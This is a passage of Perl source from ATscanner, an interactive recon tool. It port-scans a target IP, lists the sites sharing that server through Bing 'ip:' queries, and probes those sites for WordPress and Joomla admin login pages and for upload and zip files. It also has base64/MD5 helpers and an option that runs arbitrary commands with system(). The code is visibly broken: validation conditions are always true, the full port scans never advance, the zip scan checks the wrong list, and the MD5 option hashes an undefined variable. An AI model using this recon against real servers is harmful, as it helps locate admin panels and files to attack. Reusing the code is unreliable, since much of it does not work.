  #ID VALIDATION
  if ($ID != 1 or 2 or 3 or 4 or 5 or 6 or 7 or 8 or 9) {
    print color 'red';
    print "    [!] Upsss.. Invalid Option!\n";
	print color RESET;
	sleep(1);
	goto ID;
  }
}
#######################################################################
#######################################################################
#SERVER SCANNER
if($task eq "3"){

  VUELTA:;
  print color 'yellow';
  print "    [+] Please enter server IP";
  print "\n    [+] Target: ";
  print color RESET;
  $Target=<STDIN>;
  chomp($Target);
  server();
  if (($Target !~ m/.txt/i) && ($Target !~ m/.log/i)){
    if ($Target!~m/(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})/ && ($1<=255 && $2<=255 && $3<=255 && $4<=255 )){
      print color 'red';
      print "    [!] The given IP is not valid!\n";
      print color RESET;
	  goto VUELTA;
    }
  }
  
  sleep (1);
  IDS:;
  print color 'bold magenta';
  print "[..][+] SCAN SERVER OPTIONS\n";
  print color 'magenta', RESET;
  print "    ::::::::::::::::::::::::::::::::::::::\n";
  print "    [+] 1 = SCAN PORTS\n";
  print "    [+] 2 = GET SERVER SITES\n";
  print "    [+] 3 = GET SERVER WORDPRESS SITES\n";
  print "    [+] 4 = GET SERVER JOOMLA SITES\n";
  print "    [+] 5 = GET UPLOAD FILES\n";
  print "    [+] 6 = GET ZIP FILES\n";
  print "    [+] 7 = BACK (<-)\n";
  print "    [+] 8 = EXIT (->)\n";
  print "    ::::::::::::::::::::::::::::::::::::::\n";

  print color 'yellow';
  print "    [+] Please select an option -> ";
  print color RESET;
  $IDS =<STDIN>;
  chomp($IDS);

  ##########
  ##SCAN PORTS
  if ($IDS==1) {

    menu:;
    print color 'bold magenta';
    print "[..][+] PORT SCANNER OPTIONS\n";
    print color 'magenta', RESET;
    print "    ::::::::::::::::::::::::::::::::::::::\n";
    print "    [+] 1 = BASIC MODE TCP (Quick)\n";
    print "    [+] 2 = BASIC MODE UDP (Quick)\n";
    print "    [+] 3 = BASIC MODE TCP + UDP (Quick)\n";
    print "    [+] 4 = COMPLETE MODE TCP\n";
    print "    [+] 5 = COMPLETE MODE UDP\n";
    print "    [+] 6 = COMPLETE MODE TCP + UDP\n";
    print "    [+] 7 = DIFINDED TCP\n";
    print "    [+] 8 = DIFINDED UDP\n";
    print "    [+] 9 = DIFINDED TCP + UDP\n";
    print "    [+] 10 = BACK (<-)\n";
    print "    [+] 11 = EXIT (->)\n";
    print "    ::::::::::::::::::::::::::::::::::::::\n";
    print color 'yellow';
    print "    [+] Select an option -> ";
    print color RESET;
    $menu=<STDIN>;
    chomp($menu);
	
    ##################################
    sub finports {
    ##################################
      after6:;
      print color 'yellow';
      print "    [+] Now You Want To Back To Menu (1) Or Exit (0) ? ";
	  print color RESET;
      $after6=<STDIN>;
      chomp ($after6);
      if ($after6==1) {
        goto menu;
      }
      if ($after6==0) {
        print color 'red';
        print "    [!] Have A Good Time! Bye.\n";
	    print color RESET;
        exit;
      }
      if ($after6 != 1 or 0) {
	    print color 'red';
        print "    [!] Upsss.. Invalid Option!\n";
	    print color RESET;
        sleep(1);
        goto after6;
      }
    }
    ##################################

    ##################################
    sub basic {
      server();
      $type=$_[0];
      forwait();
      open (TEXT, "servers.txt");
	  while (my $Target = <TEXT>) { ###
	    chomp $Target;
		print" \n";        
        print "    [+] Checking $Target \n";

	    $Target=$Target;
	    sleep(1);
        $closed1=0;
        @PORTS=(20,21,22,23,24,25,35,37,53,80,88,130,135,161,162,443,445,530,546,547,561,1433,1434,1701,1723,2082,2087,2121,2222,3306,3389,8080);
        foreach $port1(@PORTS){
          $socket = IO::Socket::INET->new(PeerAddr=>"$Target",PeerPort=>"$port1",Proto=>"$type",Timeout=>"0.5") or $closed1++;
          close $socket;
          if ($closed1==0){
	        print color 'green';
            print "\n    [!] Open '$type' Port -> ";
            print "$port1";
		    print color RESET;
          }
          $closed1=0;
        }
	  }
      print color 'red';
      print "\n    [!] SCAN FINISHED!\n";
	  print color RESET;
    }
    ################################

    ################################
    sub basic2 {
      server();
      forwait();
      open (TEXT, "servers.txt");
	  while (my $Target = <TEXT>) { ###
	    chomp $Target;
		print" \n";        
        print "    [+] Checking $Target \n";

	    $Target=$Target;
	  
	    sleep(1);
        $closed2=0;
        $closed3=0;
        @PORTS=(20,21,22,23,24,25,35,37,53,80,88,130,135,161,162,443,445,530,546,547,561,1433,1434,1701,1723,2082,2087,2121,2222,3306,3389,8080);
        foreach $port2(@PORTS){
          $socket = IO::Socket::INET->new(PeerAddr=>"$Target",PeerPort=>"$port2",Proto=>"tcp",Timeout=>"0.5") or $closed2++;
          close $socket;
          $socket2 = IO::Socket::INET->new(PeerAddr=>"$Target",PeerPort=>"$port2",Proto=>"udp",Timeout=>"0.5") or $closed3++;
          close $socket2;
          if ($closed2==0){
	        print color 'green';
            print "\n    [!] Open TCP Port -> ";
            print "$port2";
		    print color RESET;
          }
          if ($closed3==0){
	        print color 'green';
            print "\n    [!] Open UDP Port -> ";
            print "$port2";
		    print color RESET;
          }
          $closed2=0;
          $closed3=0;
        }
	  }
      print color 'red';
      print "\n    [!] SCAN FINISHED!\n";
	  print color RESET;
    }
    #########################################
    sub complete {
      server();
      $type2=$_[0];
	  
      forwait();
      open (TEXT, "servers.txt");
	  while (my $Target = <TEXT>) { ###
	    chomp $Target;
		print" \n";        
        print "    [+] Checking $Target \n";

	    $Target=$Target;
	    sleep(1);
        $closed3=0;
        $port3=1;
        while ($port3<=65535){
          $socket = IO::Socket::INET->new(PeerAddr=>"$Target",PeerPort=>"$port3",Proto=>"$type2") or $closed3++;
          close $socket;
          if ($closed3==0){
	        print color 'green';
            print "\n    [!] Open $type2 Port -> ";
            print "$port3";
		    print color RESET;
          }
		}
        $closed3=0;
        $port3++;
      }
      print color 'red';
      print "\n    [!] SCAN FINISHED!\n";
	  print color RESET;
    }
    #####################################
    sub complete2 {
      server();
      forwait();
      open (TEXT, "servers.txt");
	  while (my $Target = <TEXT>) { ###
	    chomp $Target;
		print" \n";        
        print "    [+] Checking $Target \n";

	    $Target=$Target;
	    sleep(1);
        $closed4=0;
        $closed5=0;
        $port4=1;
        while ($port4<=65535){
          $socket = IO::Socket::INET->new(PeerAddr=>"$Target",PeerPort=>"$port4",Proto=>"tcp") or $closed4++;
          close $socket;
          $socket2 = IO::Socket::INET->new(PeerAddr=>"$Target",PeerPort=>"$port4",Proto=>"udp") or $closed5++;
          close $socket2;
          if ($closed4==0){
	        print color 'green';
            print "\n    [!] Found TCP An Open Port -> ";
            print "$port4";
	        print color RESET;
          }

          if ($closed5==0){
	        print color 'green';
            print "\n    [!] Found UDP An Open Port -> ";
            print "$port4";
	        print color RESET;
          }
        }
        $closed4=0;
        $closed5=0;
        $port4++;
      }
      print color 'red';
      print "\n    [!] SCAN FINISHED!\n";
	  print color RESET;
    }
    #########################################
    sub subuser {
    #########################################
      server();
      print color 'yellow';
      print "[..][+] Type Start Of The Port : ";
	  print color RESET;
      $start=<STDIN>;
      chomp($start);
      print color 'yellow';
      print "[..][+] Type End Of The Port : ";
	  print color RESET;
      $end=<STDIN>;
      chomp($end);
    }
    #########################################
    sub user {
      subuser();
      $type3=$_[0];
	  
      forwait();
      open (TEXT, "servers.txt");
	  while (my $Target = <TEXT>) { ###
	    chomp $Target;
		print" \n";        
        print "    [+] Checking $Target \n";

	    $Target=$Target;
	    sleep(1);
        $closed6=0;
        while ($start<=$end){
          $socket = IO::Socket::INET->new(PeerAddr=>"$Target",PeerPort=>"$start",Proto=>"$type3") or $closed6++;
          close $socket;
          if ($closed6==0){
	        print color 'green';
            print "\n    [!] Open $type3 Port -> ";
            print "$start";
		    print color RESET;
          }
          $closed6=0;
          $start++;
		}
      }
      print color 'red';
      print "\n    [!] SCAN FINISHED!\n";
	  print color RESET;
   }
   ##################################
   sub user2 {
      subuser();
      forwait();
      open (TEXT, "servers.txt");
	  while (my $Target = <TEXT>) { ###
	    chomp $Target;
		print" \n";        
        print "    [+] Checking $Target \n";

	    $Target=$Target;
	    sleep(1);
        $closed7=0;
        $closed8=0;
        while ($start<=$end){
          $socket = IO::Socket::INET->new(PeerAddr=>"$Target",PeerPort=>"$start",Proto=>"tcp") or $closed7++;
          close $socket;
          $socket = IO::Socket::INET->new(PeerAddr=>"$Target",PeerPort=>"$start",Proto=>"udp") or $closed8++;
          close $socket;
          if ($closed7==0){
	        print color 'green';
            print "\n    [!] Open TCP Port -> ";
            print "$start";
          print color RESET;
          }  
          if ($closed8==0){
	        print color 'green';
            print "\n    [!] Open UDP Port -> ";
            print "$start";
	        print color RESET;
          }
          $closed7=0;
          $closed8=0;
          $start++;
		}
      }
      print color 'red';
      print "\n    [!] SCAN FINISHED!\n";
	  print color RESET;
    }
	finports();

####################################
    if ($menu==1) {basic('tcp');}
    if ($menu==2) {basic('udp');}
    if ($menu==3) {basic2();}
    if ($menu==4) {complete('tcp');}
    if ($menu==5) {complete('udp');}
    if ($menu==6) {complete2();}
    if ($menu==7) {user('tcp');}
    if ($menu==8) {user('udp');}
    if ($menu==9) {user2();}
    if ($menu==10) {goto IDS;}
    if ($menu==11) {
      print color 'red';
      print "    [!] Have A Good Time! Bye.\n";
	  print color RESET;
	  sleep(1);
	  exit;
    }
    if ($menu != 1 or 2 or 3 or 4 or 5 or 6 or 7 or 8 or 9 or 10 or 11) {
      print color 'red';
      print "    [!] Upsss.. Invalid Option!\n";
	  print color RESET;
	  sleep(1);
	  goto menu;
    }
  } #END($IDS==1)
#########
#################################
#################################
#SITES IN THE SERVER
  if ($IDS==2) {
  
    nresult3:;
    print color 'yellow';
    print "    [+] Number of results (must be <= existants search results!): ";
    print color RESET;
    $nresult3 = <STDIN>;
    chomp($nresult3);
	
	if (!$nresult3){ 
      print color 'red';
	  print "    [+] Uppss.. you have to set a value!\n";
      print color RESET;
	  goto nresult3;
	};
##############################################################
sub submsites {
  server();
  $nresult3 = $mpages;
  msites();
}
##############################################################
##############################################################
## bgn sub msites
   sub msites {
##############################################################
    forwait();
    $listcheck = "Server_sites_Scan.txt";
    if (-e $listcheck){ unlink 'Server_sites_Scan.txt'};
	
	open (FILE, "servers.txt");
    while (my $Target = <FILE>) {
      print "\n";
      print color 'bold';
      print "    [+] checking $Target \n";
      print color RESET;
	  
      $s_results3 = $Target;
      my @scanlist3=&scan3($s_results3);
      sub scan3(){
        my @search3;
        for($npages3=1;$npages3<=$nresult3;$npages3+=1){
          my $google3=("http://www.bing.com/search?q=ip%3A".$s_results3."&first=".$npages3);
          my $search3=$ua->get("$google3");
          $search3->as_string;
          my $Res3=$search3->content;
          while($Res3 =~ m/<a href=\"?http:\/\/([^>\"]*)/g){
          if($1 !~ /msn|live|microsoft|WindowsLiveTranslator|youtube|google|cache|74.125.153.132|inurl:|q=|404|403|Time|out|Network|Failed/){
            my $domain2=$1;
            $domain2=~s/&(.*)/\ /g;
			
            if($domain2 =~ /([^:]*:\/\/)?([^\/]+\.[^\/]+)/g) {
              $site = $2;
            }			
	          print color 'green';
              print "    [+] http://$site\n";
	          print color RESET;

              open (TEXT, '>>Server_sites_Scan.txt');
              print TEXT "http://$site\n";
              close (TEXT);
			  
			  my $file = 'Server_sites_Scan.txt';
              my %seen = ();
              {
                local @ARGV = ($file);
                local $^I = '.bac';
                while(<>){
                  $seen{$_}++;
                  next if $seen{$_} > 1;
                  print;
                  close (TEXT);
				  unlink "Server_sites_Scan.txt.bac";
				  unlink "servers.txt";
                }
              }
            }
          }
        }
      }   
    }
	
    $list = "Server_sites_Scan.txt";
	if (-e $list){
	  print "\n";	
	  my $lc = 0;
	  my $file = "Server_sites_Scan.txt";
      open my $file, "<", "Server_sites_Scan.txt";
      $lc++ while <$file>;
	  print color 'green';
	  print "    [!] $lc Unique Result(s) Found!\n";
	  print color RESET;
	  close $file;
	  
	  print color 'green';
      print "    [!] Results saved in $Bin Server_sites_Scan.txt! \n";
	  print color RESET;
	}else{ 
      print color 'red';
      print "    [!] No Sites Found in the server! Try changing number of results to scan!\n";
	  print color RESET;
	}
	
	if (defined $mwpsites) {
	  print "\n    [+]::::::::::::::::::::::::::::::::::::::\n";
	  print color 'bold';
	  print "    [!] ::: SUBPROCESS ... \n";
	  print color RESET;
	  print "   [+]::::::::::::::::::::::::::::::::::::::\n\n ";
	  sleep(1);
	}else{
      print color 'red';
      print "    [!] SCAN FINISHED!\n";
	  print color RESET;
	}
##############################################################
  } ## end sub msites
  msites ();
##############################################################

    after1:;
    print color 'yellow';
    print "    [+] Now You Want To Back To Menu (1) Or Exit (0) ? ";
	print color RESET;
    $after1=<STDIN>;
    chomp ($after1);
    if ($after1==1) {
      print color 'red';
      print "    [!] The Program will restart in 4s to reset scan buffing...\n";
	  print color RESET;
	  sleep(4);
      exec( $^X, $0, @ARGV);
    }
    if ($after1==0) {
        print color 'red';
        print "    [!] Have A Good Time! Bye.\n";
	    print color RESET;
      exit;
    }
    if ($after1 != 1 or 0) {
	    print color 'red';
        print "    [!] Upsss.. Invalid Option!\n";
	    print color RESET;
      sleep(1);
      goto after1;
    }
  }
##END ($IDS==2)
#########

#########
#########
##BEG ($IDS==3)#WORDPRESS SITES
  if ($IDS==3) {
  
    $listcheck2 = "Server_sites_Scan.txt";
    if (!-e $listcheck2){
	  sleep(1);
	  print color 'red';
	  print "    [+] Please make a scan to get the server sites First!!\n";
	  print color RESET;
	  goto IDS;
    }
    #####################################################	
    sub mwpsites {
    #####################################################
      submsites();
      $listcheck = "WP_server_sites_Scan.txt";
      if (-e $listcheck){ unlink 'WP_server_sites_Scan.txt'};
      print color 'yellow';
	  print "    [+] Scaning Results Please wait...\n";
      print color RESET;
      sleep(1);
      $listcheck2 = "Server_sites_Scan.txt";
      if (!-e $listcheck2){
	    sleep(1);
	    print color 'red';
	    print "    [+] Please make a scan to get the server sites First!!\n";
	    print color RESET;
        exit;
      }
    
      my $lc = 0;
	  my $file = "Server_sites_Scan.txt";
      open my $file, "<", "Server_sites_Scan.txt";
      $lc++ while <$file>;
	  print color 'yellow';
	  print "    [!] $lc Site(s) to Scan..\n";
	  print color RESET;
	  close $file;
      open (TEXT, "Server_sites_Scan.txt");
      while (my $site2 = <TEXT>) {
	    chomp $site2;
        print "    [+] Checking $site2\n";
	    $query = "/wp-login.php";
        my $URL = $site2.$query;
        $request = HTTP::Request->new('GET', $URL);
        $response = $ua->request($request);
        my $html = $response->content;
	    if ( $html =~ m/loginform/i || m/user_login/i || m/username/i || m/email/i || m/Password/i || m/cPanel/i || m/admin/i || m/user_pass/i ){
		  print color 'green';
          print "    [!] $site2\n";
		  print color RESET;
          open (LOG, '>>WP_server_sites_Scan.txt');
          print LOG "$site2\n";
		  close (LOG);
        }
      }
	  
      $list = "WP_server_sites_Scan.txt";
	  if (-e $list){
	    print "\n";	
	    my $lc = 0;
	    my $file = "WP_server_sites_Scan.txt";
        open my $file, "<", "WP_server_sites_Scan.txt";
        $lc++ while <$file>;
	    print color 'green';
	    print "    [!] $lc Unique Result(s) Found!\n";
	    print color RESET;
	    close $file;
	  
	    print color 'green';
        print "    [!] Results saved in $Bin WP_server_sites_Scan.txt! \n";
	    print color RESET;
	  }else{ 
        print color 'red';
        print "    [!] No Wordpress Sites Found!\n";
	    print color RESET;
	  }
      print color 'red';
      print "    [!] SCAN FINISHED!\n";
	  print color RESET;
    }  
    ##############################################################
    ## end sub mwpsites
    ##############################################################
    mwpsites();

    after1:;
    print color 'yellow';
    print "    [+] Now You Want To Back To Menu (1) Or Exit (0) ? ";
	print color RESET;
    $after1=<STDIN>;
    chomp ($after1);
    if ($after1==1) {
      goto IDS;
    }
    if ($after1==0) {
      print color 'red';
      print "    [!] Have A Good Time! Bye.\n";
	  print color RESET;
      exit;
    }
    if ($after1 != 1 or 0) {
	  print color 'red';
      print "    [!] Upsss.. Invalid Option!\n";
	  print color RESET;
      sleep(1);
      goto after1;
    }
  }
##END ($IDS==3)
#########

#########
#########
##BEG ($IDS==4) #JOOMLA SITES

  if ($IDS==4) {
    $listcheck2 = "Server_sites_Scan.txt";
    if (!-e $listcheck2){
	  sleep(1);
	  print color 'red';
	  print "    [+] Please make a scan to get the server sites First!!\n";
	  print color RESET;
	  goto IDS;
    }
    #####################################################	
    sub mjoomsites {
    #####################################################
      submsites();
      $listcheck = "Joom_server_sites_Scan.txt";
      if (-e $listcheck){ unlink 'Joom_server_sites_Scan.txt'};
      print color 'yellow';
	  print "    [+] Scaning Results Please wait...\n";
      print color RESET;
      sleep(1);
      $listcheck2 = "Server_sites_Scan.txt";
      if (!-e $listcheck2){
	    sleep(1);
	    print color 'red';
	    print "    [+] Please make a scan to get the server sites First!!\n";
	    print color RESET;
        exit;
      }
	
	  my $lc = 0;
	  my $file = "Server_sites_Scan.txt";
      open my $file, "<", "Server_sites_Scan.txt";
      $lc++ while <$file>;
	  print color 'yellow';
	  print "    [!] $lc Site(s) to Scan..\n";
	  print color RESET;
	  close $file;
      open (TEXT, "Server_sites_Scan.txt");
      while (my $site2 = <TEXT>) {
	    chomp $site2;
        print "    [+] Checking $site2\n";
	  
	    $query = "/administrator/index.php";
        my $URL = $site2.$query;
        $request = HTTP::Request->new('GET', $URL);
        $response = $ua->request($request);
        my $html = $response->content;
	    if ( $html =~ m/mod-login-password/i || m/username/i || m/passwd/i || m/submit/i ){
		  print color 'green';
          print "    [!] $site2\n";
		  print color RESET;
          open (LOG, '>>Joom_server_sites_Scan.txt');
          print LOG "$site2\n";
		  close (LOG);
        }
      }
      $list = "Joom_server_sites_Scan.txt";
	  if (-e $list){
	    print "\n";	
	    my $lc = 0;
	    my $file = "Joom_server_sites_Scan.txt";
        open my $file, "<", "Joom_server_sites_Scan.txt";
        $lc++ while <$file>;
	    print color 'green';
	    print "    [!] $lc Unique Result(s) Found!\n";
	    print color RESET;
	    close $file;
	  
	    print color 'green';
        print "    [!] Results saved in $Bin Joom_server_sites_Scan.txt! \n";
	    print color RESET;
	  }else{ 
        print color 'red';
        print "    [!] No Joomla Sites Found!\n";
	    print color RESET;
	  }
	
      print color 'red';
      print "    [!] SCAN FINISHED!\n";
	  print color RESET;
    }  
    ##############################################################
    ## end sub mjoomsites
    ##############################################################
    mjoomsites();
    after1:;
    print color 'yellow';
    print "    [+] Now You Want To Back To Menu (1) Or Exit (0) ? ";
	print color RESET;
    $after1=<STDIN>;
    chomp ($after1);
    if ($after1==1) {
      goto IDS;
    }
    if ($after1==0) {
        print color 'red';
        print "    [!] Have A Good Time! Bye.\n";
	    print color RESET;
      exit;
    }
    if ($after1 != 1 or 0) {
	    print color 'red';
        print "    [!] Upsss.. Invalid Option!\n";
	    print color RESET;
      sleep(1);
      goto after1;
    }
  }
##END ($IDS==4)
##########

##########
##UPLOAD FILES
  if ($IDS==5) {
    $listcheck2 = "Server_sites_Scan.txt";
    if (!-e $listcheck2){
	  sleep(1);
	  print color 'red';
	  print "    [+] Please make a scan to get the server sites First!!\n";
	  print color RESET;
	  goto IDS;
    }
    #####################################################	
    sub muploadsites {
    #####################################################
      submsites();
      $listcheck = "Upload_server_files_Scan.txt";
      if (-e $listcheck){ unlink 'Upload_server_files_Scan.txt'};
      print color 'yellow';
	  print "    [+] Scaning Results Please wait...\n";
      print color RESET;
      sleep(1);
      $listcheck2 = "Server_sites_Scan.txt";
      if (!-e $listcheck2){
	    sleep(1);
	    print color 'red';
	    print "    [+] Please make a scan to get the server sites First!!\n";
	    print color RESET;
        exit;
      }
	
	  my $lc = 0;
	  my $file = "Server_sites_Scan.txt";
      open my $file, "<", "Server_sites_Scan.txt";
      $lc++ while <$file>;
	  print color 'yellow';
	  print "    [!] $lc Site(s) to Scan..\n";
	  print color RESET;
	  close $file;
      open (TEXT, "Server_sites_Scan.txt");
      while (my $site2 = <TEXT>) {
	    chomp $site2;
        print "    [+] Checking $site2\n";
	  
        foreach $UPLOAD(@UPLOAD){
          my $URL = $site2.$UPLOAD;
          $request = HTTP::Request->new('GET', $URL);
          $response = $ua->request($request);
          my $html = $response->content;
          if ( $response->is_success ) {
		    print color 'green';
            print "    [!] $site2\n";
		    print color RESET;
            open (LOG, '>>Upload_server_files_Scan.txt');
            print LOG "$site2\n";
		    close (LOG);
          }
        }
      }
      $list = "Upload_server_files_Scan.txt";
	  if (-e $list){
	    print "\n";	
	    my $lc = 0;
	    my $file = "Upload_server_files_Scan.txt";
        open my $file, "<", "Upload_server_files_Scan.txt";
        $lc++ while <$file>;
	    print color 'green';
	    print "    [!] $lc Unique Result(s) Found!\n";
	    print color RESET;
	    close $file;
	  
	    print color 'green';
        print "    [!] Results saved in $Bin Upload_server_files_Scan.txt! \n";
	    print color RESET;
	  }else{ 
        print color 'red';
        print "    [!] No Upload Sites Found!\n";
	    print color RESET;
	  }
	
      print color 'red';
      print "    [!] SCAN FINISHED!\n";
	  print color RESET;
    }  
    ##############################################################
    ## end sub muploadsites
    ##############################################################
    muploadsites();
    after1:;
    print color 'yellow';
    print "    [+] Now You Want To Back To Menu (1) Or Exit (0) ? ";
	print color RESET;
    $after1=<STDIN>;
    chomp ($after1);
    if ($after1==1) {
      goto IDS;
    }
    if ($after1==0) {
        print color 'red';
        print "    [!] Have A Good Time! Bye.\n";
	    print color RESET;
      exit;
    }
    if ($after1 != 1 or 0) {
	    print color 'red';
        print "    [!] Upsss.. Invalid Option!\n";
	    print color RESET;
      sleep(1);
      goto after1;
    }
  }
##END ($IDS==5)

##########
##########
##ZIP FILES
  if ($IDS==6) {
    $listcheck2 = "Zip_server_files_Scan.txt";
    if (!-e $listcheck2){
	  sleep(1);
	  print color 'red';
	  print "    [+] Please make a scan to get the server sites First!!\n";
	  print color RESET;
	  goto IDS;
    }
    #####################################################	
    sub mzipsites {
    #####################################################
      submsites();
      $listcheck = "Zip_server_files_Scan.txt";
      if (-e $listcheck){ unlink 'Zip_server_files_Scan.txt'};
      print color 'yellow';
	  print "    [+] Scaning Results Please wait...\n";
      print color RESET;
      sleep(1);
      $listcheck2 = "Server_sites_Scan.txt";
      if (!-e $listcheck2){
	    sleep(1);
	    print color 'red';
	    print "    [+] Please make a scan to get the server sites First!!\n";
	    print color RESET;
        exit;
      }
	
	  my $lc = 0;
	  my $file = "Server_sites_Scan.txt";
      open my $file, "<", "Server_sites_Scan.txt";
      $lc++ while <$file>;
	  print color 'yellow';
	  print "    [!] $lc Site(s) to Scan..\n";
	  print color RESET;
	  close $file;
      open (TEXT, "Server_sites_Scan.txt");
      while (my $site2 = <TEXT>) {
	    chomp $site2;
        print "    [+] Checking $site2\n";
	  
        foreach $ZIP(@ZIP){
          my $URL = $site2.$UPLOAD;
          $request = HTTP::Request->new('GET', $URL);
          $response = $ua->request($request);
          my $html = $response->content;
          if ( $response->is_success ) {
		    print color 'green';
            print "    [!] $site2\n";
		    print color RESET;
            open (LOG, '>>Zip_server_files_Scan.txt');
            print LOG "$site2\n";
		    close (LOG);
          }
        }
      }
      $list = "Zip_server_files_Scan.txt";
	  if (-e $list){
	    print "\n";	
	    my $lc = 0;
	    my $file = "Zip_server_files_Scan.txt'";
        open my $file, "<", "Zip_server_files_Scan.txt";
        $lc++ while <$file>;
	    print color 'green';
	    print "    [!] $lc Unique Result(s) Found!\n";
	    print color RESET;
	    close $file;
	  
	    print color 'green';
        print "    [!] Results saved in $Bin Zip_server_files_Scan.txt! \n";
	    print color RESET;
	  }else{ 
        print color 'red';
        print "    [!] No Zip Files Found in those Server Sites!\n";
	    print color RESET;
	  }
	
      print color 'red';
      print "    [!] SCAN FINISHED!\n";
	  print color RESET;
    }  
    ##############################################################
    ## end sub mzipsites
    ##############################################################
    mzipsites();
    after1:;
    print color 'yellow';
    print "    [+] Now You Want To Back To Menu (1) Or Exit (0) ? ";
	print color RESET;
    $after1=<STDIN>;
    chomp ($after1);
    if ($after1==1) {
      goto IDS;
    }
    if ($after1==0) {
        print color 'red';
        print "    [!] Have A Good Time! Bye.\n";
	    print color RESET;
      exit;
    }
    if ($after1 != 1 or 0) {
	    print color 'red';
        print "    [!] Upsss.. Invalid Option!\n";
	    print color RESET;
      sleep(1);
      goto after1;
    }
  }
########

#########
##BEG (BACK)
  if ($IDS == 7) {
	goto TASKS;
  }
##END IDS 7 (BACK)
#########
##BEG ($IDS==8)
#Exit
  if ($IDS==8) {
    print color 'red';
    print "[..][!] Have A Good Time! Bye.\n";
    print color RESET;
    exit;
  }
##END ($IDS==6)

  if ($IDS != 1 or 2 or 3 or 4 or 5 or 6 or 7 or 8) {
    print color 'red';
    print "    [!] Upsss.. Invalid Option!\n";
	print color RESET;
	sleep(1);
	goto IDS;
  }
}  
#######################################################################
#######################################################################
#ENCODE/DECODE
if($task eq "4"){
  use Digest::MD5;
  use MIME::Base64;
  sleep (1);
  
  code:;
  print color 'yellow';
  print "    [+] Please Enter your string";
  print "\n    [+] String: ";
  print color RESET;
  $string=<STDIN>;
  chomp ($string);

  if (!$string){ 
      print color 'red';
	  print "    [+] Uppss.. you have to set a value!\n";
      print color RESET;
	  goto code;
  };
  
  DECODE:;
  print color 'bold magenta';
  print "[..][+] BASE 64 ENCODE - DECODE / MD5\n";
  print color 'magenta', RESET;
  print "    ::::::::::::::::::::::::::::::::::::::\n";
  print "    [+] 1 = MD5 Generator\n";
  print "    [+] 2 = Encode Base64\n";
  print "    [+] 3 = Decode Base64\n";
  print "    [+] 4 = BACK (<-)\n";
  print "    [+] 5 = EXIT (->)\n";
  print "    ::::::::::::::::::::::::::::::::::::::\n";
  print color 'yellow';
  print "    [+] Select an option -> ";
  print color RESET;
  $decodetype =<STDIN>;
  chomp($decodetype);
    
##########
#MD5 GENERATEUR
  if ($decodetype==1){
    sub mmd5 {
	  $string = $string;
      sleep (1);
	  print color 'green';
      print "    [+] MD5 => ";
      print Digest::MD5->md5_hex("$md");
	  print "\n";
	  print color RESET;
    }
	mmd5();
    after1:;
    print color 'yellow';
    print "    [+] Now You Want To Back To Menu (1) Or Exit (0) ? ";
    print color RESET;
    $after1=<STDIN>;
    chomp ($after1);
    if ($after1==1) {
      goto DECODE;
    }
    if ($after1==0) {
      print color 'red';
      print "    [!] Have A Good Time! Bye.\n";
      print color RESET;
      exit;
    }
    if ($after1 != 1 or 0) {
      print color 'red';
      print "    [!] Upsss.. Invalid Option!\n";
      print color RESET;
      sleep(1);
      goto after1;
    }
  }

##########
#ENCODE BASE 64
  if ($decodetype==2){
    sub mencode64 {
	  $string = $string;
      sleep (1);
      $sss=encode_base64($string);
	  print color 'green';
      print "    [!] Base64 encoded => $sss\n";
	  print color RESET;
	}
	mencode64();  
    after2:;
    print color 'yellow';
    print "    [+] Now You Want To Back To Menu (1) Or Exit (0) ? ";
    print color RESET;
    $after2=<STDIN>;
    chomp ($after2);
    if ($after2==1) {

      goto DECODE;
    }
    if ($after2==0) {
      print color 'red';
      print "    [!] Have A Good Time! Bye.\n";
      print color RESET;
      exit;
    }
    if ($after2 != 1 or 0) {
      print color 'red';
      print "    [!] Upsss.. Invalid Option!\n";
      print color RESET;
      sleep(1);
      goto after2;
    }	
  }

##########
#DECODE BASE 64
  if ($decodetype==3){
    sub mdecode64 {
	  $string = $string;
      sleep (1);
      $rrr=decode_base64($string);
	  print color 'green';
      print "    [!] Base64 decoded => $rrr \n";
	  print color RESET;
    }
	mdecode64();
    after3:;
    print color 'yellow';
    print "    [+] Now You Want To Back To Menu (1) Or Exit (0) ? ";
    print color RESET;
    $after3=<STDIN>;
    chomp ($after3);
    if ($after3==1) {
      goto DECODE;
    }
    if ($after3==0) {
      print color 'red';
      print "    [!] Have A Good Time! Bye.\n";
      print color RESET;
      exit;
    }
    if ($after3 != 1 or 0) {
      print color 'red';
      print "    [!] Upsss.. Invalid Option!\n";
      print color RESET;
      sleep(1);
      goto after3;
    }	
  }
##########
  ##########
  #BACK
  if ($decodetype == 4) {
    goto TASKS;
  }
  ##########
  #Exit
  if ($decodetype==5){
    print color 'red';
    print "[..][!] Have A Good Time! Bye.\n";
    print color RESET;
    exit;
  }

  if ($DECODE != 1 or 2 or 3 or 4 or 5) {
    print color 'red';
    print "    [!] Upsss.. Invalid Option!\n";
    print color RESET;
    sleep(1);
    goto DECODE;
  }
}

#######################################################################
#######################################################################
#TERMINAL
if($task eq "5"){

  TERMINAL:;
  print color 'yellow'; 
  print "    [+] Enter Command: ";
  print color RESET;
  $command=<STDIN>;
  chomp ($command);
  if (!$command){ 
    print color 'red';
    print "    [+] Please set a Command!\n";
    print color RESET;
    goto TERMINAL;
  };
  sub mcommand {
    if (defined $dork) {
	  if (defined $mtarget) {
	    submsearch();
	    $listname="Search_Scan.txt";
        countargets();
	    forwait();
        open (TEXT, $listname);
	    while (my $Target = <TEXT>) { 
	      chomp $Target;
	      if($Target !~ /http:\/\//) { $Target = "http://$Target"; };
          print color 'yellow'; 
          print "\n    [+] $Target";
          print "\n    ===========================================\n";
          print color RESET;
		  system("$mcommand $Target");
	    }
	  }
	}else{
      system("$command");
	}
    print color 'red';
    print "    [!] SCAN FINISHED!\n";
    print color RESET;
  }
  mcommand();
  
  after1:;
  print color 'yellow';
  print "    [+] Now You Want To Back To Menu (1) Or Exit (0) ? ";
  print color RESET;
  $after1=<STDIN>;
  chomp ($after1);
  if ($after1==1) {
    goto TASKS;
  }
  if ($after1==0) {
    print color 'red';
    print "    [!] Have A Good Time! Bye.\n";
    print color RESET;
    exit;
  }
  if ($after1 != 0 or 1) {
	print color 'red';
    print "    [!] Upsss.. Invalid Option!\n";
	print color RESET;
    sleep(1);
    goto after1;
  }
}
#######################################################################
#######################################################################
#ABOUT
if($task eq "6"){
  
  print color 'bold cyan';
  print "
     [+]================================================================[+]
     [+]--------------               ATscanner            --------------[+]
     [+]================================================================[+]
     [+]--------------           AlisamTechnology         --------------[+]
     [+]------ https://www.fb.com/Forces.des.tempetes.marocaines  ------[+]
     [+]------        https://www.youtube.com/user/aliartes       ------[+]
